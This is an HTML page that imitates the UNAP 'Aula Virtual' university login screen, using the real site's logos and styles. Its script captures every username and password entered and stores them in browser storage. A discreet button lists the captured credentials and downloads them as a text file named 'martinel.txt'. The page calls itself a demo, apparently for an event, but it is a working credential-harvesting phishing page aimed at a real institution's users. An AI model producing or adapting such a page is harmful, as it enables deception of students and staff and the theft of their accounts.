<!DOCTYPE html>
<html ng-app="App" lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="description" content="Aula Virtual - Demo Guardado TXT" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <title>Aula Virtual | Demo Guardar TXT</title>

    <link href="https://aulavirtual2.unap.edu.pe/images/themes/unap/favicon.ico" rel="icon">
    <link rel="stylesheet" type="text/css" href="https://aulavirtual2.unap.edu.pe/assets/vendors/bootstrap/dist/css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="https://aulavirtual2.unap.edu.pe/assets/common/css/source/auth-main.css" />
    <link rel="stylesheet" type="text/css" href="https://aulavirtual2.unap.edu.pe/assets/common/css/source/forms/form-validation.css" />
    <link href="https://aulavirtual2.unap.edu.pe/css/login.css" rel="stylesheet" />
    <link href="https://aulavirtual2.unap.edu.pe/css/themes/unap/login.css" rel="stylesheet" />

    <style>
        body.theme-dark.single-page.single-page-inverse {
            background: #12121a;
        }
        .btn.button-submit { 
            cursor: pointer; 
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            font-weight: bold;
            z-index: 9999;
            animation: slideIn 0.3s ease-out;
        }
        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        .notification.success {
            background-color: #2ecc71;
            color: white;
        }
        .notification.error {
            background-color: #e74c3c;
            color: white;
        }

        /* Botón oculto */
        #btnMostrarHistorial {
            position: fixed;
            bottom: 10px;
            left: 10px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 8px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
            opacity: 0.5;
            transition: all 0.3s;
            z-index: 1000;
        }

        #btnMostrarHistorial:hover {
            opacity: 1;
            background: rgba(255, 255, 255, 0.2);
        }

        /* Modal del historial */
        .modal-historial {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }

        .modal-historial.show {
            display: flex;
        }

        .modal-historial-content {
            background: #1a1a22;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 25px;
            max-width: 800px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
        }

        .modal-historial-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }

        .modal-historial-header h2 {
            color: white;
            margin: 0;
            font-size: 20px;
        }

        .btn-cerrar-modal {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }

        .btn-cerrar-modal:hover {
            background: #c0392b;
        }

        .historial-items {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .historial-item {
            background: #252530;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #2ecc71;
            color: #ddd;
            font-size: 12px;
            font-family: monospace;
            word-break: break-all;
            line-height: 1.6;
        }

        .historial-item:hover {
            background: #2a2a30;
            border-left-color: #27ae60;
        }

        .historial-vacio {
            text-align: center;
            color: #999;
            padding: 40px;
            font-size: 14px;
        }

        .btn-limpiar-historial {
            width: 100%;
            margin-top: 20px;
            padding: 10px;
            background: #e74c3c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }

        .btn-limpiar-historial:hover {
            background: #c0392b;
        }

        .btn-descargar-historial {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            background: #27ae60;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
        }

        .btn-descargar-historial:hover {
            background: #229954;
        }

        .contador-historial {
            background: #2ecc71;
            color: #000;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
            margin-left: 10px;
        }
    </style>
</head>
<body class="theme-dark single-page single-page-inverse">
    <section class="wrapper">
        <div class="intro">
            <div class="left-ovh">
                <div class="left-side">
                    <input id="IsLockedOut" value="0" hidden />
                    <input id="Reason" value="" hidden />

                    <div class="m-login__wrapper" ng-controller="login">
                        <form id="loginForm" class="form" onsubmit="return false;">
                            <a href="index.html#">
                                <img class="logo" src="https://aulavirtual2.unap.edu.pe/images/themes/unap/logo.png" draggable="false" alt="logo">
                            </a>
                            <h1>AULA VIRTUAL</h1>
                            <div id="mensaje" class="text-danger" style="font-weight: 500; display:none;"></div>

                            <div class="group">
                                <input id="username" placeholder="USUARIO" autocomplete="off" />
                                <img class="ico" src="https://aulavirtual2.unap.edu.pe/images/login/user.svg" />
                                <div class="bar"></div>
                            </div>
                            <div class="group">
                                <input id="password" type="password" placeholder="CONTRASEÑA" />
                                <img id="pass-ico" class="ico" src="https://aulavirtual2.unap.edu.pe/images/login/pass.svg" />
                                <div class="bar"></div>
                            </div>
                            <div class="group">
                                <button id="m_login_signin_submit" class="btn button-submit" type="button">
                                    INGRESAR
                                </button>
                                <a class="forget-password-label" href="https://aulavirtual2.unap.edu.pe/account/ForgotPassword">¿Olvidaste tu contraseña?</a>
                            </div>
                        </form>
                    </div>

                    <div style="width:145px;left:25px;bottom:25px;position: fixed;">
                        <img src="https://aulavirtual2.unap.edu.pe/images/login/logo.svg" style="" class="logo" alt="logo pequeño" />
                    </div>
                </div>
                <div class="triangle"></div>
            </div>

            <div class="triangle right"></div>
            <div class="container-shape one"><div class="shape one"></div></div>
            <div class="container-shape two"><div class="shape two"></div></div>
            <div class="container-shape right three"><div class="right shape three"></div></div>
            <div class="container-shape right four"><div class="right shape four"></div></div>
            <div class="container-shape right five"><div class="right shape five"></div></div>
        </div>
    </section>

    <!-- Botón oculto para mostrar historial -->
    <button id="btnMostrarHistorial" title="Mostrar historial de accesos">
        📋 Historial <span class="contador-historial" id="contadorHistorial">0</span>
    </button>

    <!-- Modal del historial -->
    <div class="modal-historial" id="modalHistorial">
        <div class="modal-historial-content">
            <div class="modal-historial-header">
                <h2>Historial de Accesos - martinel.txt</h2>
                <button class="btn-cerrar-modal" onclick="cerrarHistorial()">✕ Cerrar</button>
            </div>
            <div class="historial-items" id="historialItems">
                <div class="historial-vacio">No hay registros aún</div>
            </div>
            <button class="btn-descargar-historial" onclick="descargarHistorial()">📥 Descargar martinel.txt</button>
            <button class="btn-limpiar-historial" onclick="limpiarHistorial()">🗑️ Limpiar Historial</button>
        </div>
    </div>

    <script>
        (function(){
            const btn = document.getElementById('m_login_signin_submit');
            const inputUser = document.getElementById('username');
            const inputPass = document.getElementById('password');
            const mensaje = document.getElementById('mensaje');
            const btnMostrarHistorial = document.getElementById('btnMostrarHistorial');
            const modalHistorial = document.getElementById('modalHistorial');
            const historialItems = document.getElementById('historialItems');
            const contadorHistorial = document.getElementById('contadorHistorial');

            // Actualizar contador al cargar
            actualizarContador();

            function mostrarNotificacion(text, tipo = 'success') {
                const notif = document.createElement('div');
                notif.className = `notification ${tipo}`;
                notif.textContent = text;
                document.body.appendChild(notif);

                setTimeout(() => {
                    notif.style.animation = 'slideIn 0.3s ease-out reverse';
                    setTimeout(() => {
                        notif.remove();
                    }, 300);
                }, 4000);
            }

            function mostrarMensaje(text, esError = true) {
                mensaje.style.display = 'block';
                mensaje.style.color = esError ? '#ff6b6b' : '#8be78b';
                mensaje.textContent = text;
                setTimeout(() => {
                    mensaje.style.display = 'none';
                }, 4500);
            }

            function guardarEnMartinelTxt(usuario, contraseña) {
                try {
                    const ahora = new Date();
                    const fecha = ahora.toLocaleString('es-PE');
                    const ip = "IP_Local";
                    
                    // Formato de la línea a guardar
                    const linea = `[${fecha}] | IP: ${ip} | Usuario: ${usuario} | Contraseña: ${contraseña}`;

                    // Obtener datos previos de localStorage
                    let datosExistentes = [];
                    try {
                        const datosGuardados = localStorage.getItem('martinel_data');
                        if (datosGuardados) {
                            datosExistentes = JSON.parse(datosGuardados);
                        }
                    } catch(e) {
                        console.log('Error al parsear datos previos:', e);
                        datosExistentes = [];
                    }
                    
                    // Asegurar que es un array
                    if (!Array.isArray(datosExistentes)) {
                        datosExistentes = [];
                    }
                    
                    // Agregar la nueva línea
                    datosExistentes.push(linea);
                    
                    // Guardar en localStorage
                    localStorage.setItem('martinel_data', JSON.stringify(datosExistentes));
                    
                    console.log('Datos guardados:', datosExistentes);

                    mostrarMensaje('¡REGISTRADO!  COINSI -2025', false);
                    mostrarNotificacion('Credenciales guardadas en el historial', 'success');
                    
                    actualizarContador();
                } catch(error) {
                    console.error('Error al guardar:', error);
                    mostrarMensaje('Error al guardar los datos', true);
                    mostrarNotificacion('Error en el registro', 'error');
                }
            }

            function actualizarContador() {
                try {
                    const datosGuardados = localStorage.getItem('martinel_data');
                    let datos = [];
                    
                    if (datosGuardados) {
                        datos = JSON.parse(datosGuardados);
                    }
                    
                    if (!Array.isArray(datos)) {
                        datos = [];
                    }
                    
                    contadorHistorial.textContent = datos.length;
                    console.log('Contador actualizado:', datos.length);
                } catch(e) {
                    console.error('Error al actualizar contador:', e);
                    contadorHistorial.textContent = '0';
                }
            }

            function mostrarHistorial() {
                try {
                    const datosGuardados = localStorage.getItem('martinel_data');
                    let datos = [];
                    
                    if (datosGuardados) {
                        datos = JSON.parse(datosGuardados);
                    }
                    
                    if (!Array.isArray(datos)) {
                        datos = [];
                    }
                    
                    historialItems.innerHTML = '';

                    if (datos.length === 0) {
                        historialItems.innerHTML = '<div class="historial-vacio">No hay registros aún</div>';
                    } else {
                        datos.forEach((item, index) => {
                            const div = document.createElement('div');
                            div.className = 'historial-item';
                            div.textContent = item;
                            historialItems.appendChild(div);
                        });
                    }
                    console.log('Historial mostrado, registros:', datos.length);
                } catch(e) {
                    console.error('Error al mostrar historial:', e);
                    historialItems.innerHTML = '<div class="historial-vacio">Error al cargar el historial</div>';
                }
            }

            function descargarHistorial() {
                try {
                    const datosGuardados = localStorage.getItem('martinel_data');
                    let datos = [];
                    
                    if (datosGuardados) {
                        datos = JSON.parse(datosGuardados);
                    }
                    
                    if (!Array.isArray(datos)) {
                        datos = [];
                    }
                    
                    if (datos.length === 0) {
                        mostrarNotificacion('No hay registros para descargar', 'error');
                        return;
                    }

                    const contenido = datos.join('\n');
                    const blob = new Blob([contenido], { type: 'text/plain;charset=utf-8' });
                    const enlace = document.createElement('a');
                    enlace.href = URL.createObjectURL(blob);
                    enlace.download = 'martinel.txt';
                    enlace.style.display = 'none';

                    document.body.appendChild(enlace);
                    enlace.click();

                    setTimeout(() => {
                        document.body.removeChild(enlace);
                        URL.revokeObjectURL(enlace.href);
                    }, 100);

                    mostrarNotificacion('Archivo descargado correctamente', 'success');
                } catch(e) {
                    console.error('Error al descargar:', e);
                    mostrarNotificacion('Error al descargar el archivo', 'error');
                }
            }

            function limpiarHistorial() {
                if (confirm('¿Estás seguro de que deseas eliminar todo el historial?')) {
                    localStorage.removeItem('martinel_data');
                    mostrarHistorial();
                    actualizarContador();
                    mostrarNotificacion('Historial eliminado', 'success');
                }
            }

            function cerrarHistorial() {
                modalHistorial.classList.remove('show');
            }

            btn.addEventListener('click', function() {
                const usuario = (inputUser.value || '').trim();
                const contraseña = (inputPass.value || '').trim();

                if (!usuario || !contraseña) {
                    mostrarMensaje('Completa ambos campos: usuario y contraseña.');
                    mostrarNotificacion('Campos vacíos', 'error');
                    return;
                }

                guardarEnMartinelTxt(usuario, contraseña);

                // Limpiar campos
                inputUser.value = '';
                inputPass.value = '';
                inputUser.focus();
            });

            // Permitir guardar al presionar Enter
            inputPass.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    btn.click();
                }
            });

            // Mostrar historial al hacer clic en botón
            btnMostrarHistorial.addEventListener('click', function() {
                mostrarHistorial();
                modalHistorial.classList.add('show');
            });

            // Cerrar modal al hacer clic fuera
            modalHistorial.addEventListener('click', function(e) {
                if (e.target === modalHistorial) {
                    cerrarHistorial();
                }
            });

            document.getElementById('loginForm').addEventListener('submit', function(e){
                e.preventDefault();
            });

            // Hacer funciones disponibles globalmente
            window.mostrarHistorial = mostrarHistorial;
            window.descargarHistorial = descargarHistorial;
            window.limpiarHistorial = limpiarHistorial;
            window.cerrarHistorial = cerrarHistorial;
        })();
    </script>
</body>
</html>
